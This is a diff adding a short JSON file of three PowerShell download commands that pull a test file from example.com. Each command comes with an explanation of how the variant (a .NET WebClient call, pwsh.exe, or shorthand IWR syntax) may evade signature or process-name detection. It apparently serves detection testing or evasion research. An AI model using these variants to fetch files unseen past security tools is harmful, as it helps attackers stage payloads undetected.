@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command (New-Object System.Net.WebClient).DownloadFile('http://example.com/test.txt','C:\\Temp\\test.txt')",
+    "explanation": "This command replaces 'IWR' with an equivalent .NET WebClient method to bypass detection while maintaining the same behavior of downloading a file."
+  },
+  {
+    "output": "pwsh.exe -c Invoke-WebRequest -Uri http://example.com/test.txt -OutFile C:\\Temp\\test.txt",
+    "explanation": "This command uses 'pwsh.exe' instead of 'powershell.exe' and maintains the same functionality, which may evade detection based on process name alone."
+  },
+  {
+    "output": "powershell.exe -Command IWR http://example.com/test.txt -OutFile C:\\Temp\\test.txt",
+    "explanation": "This command omits the explicit '-Uri' parameter, which is optional, and uses shorthand syntax to achieve the same result while potentially evading signature-based detection."
+  }
+]
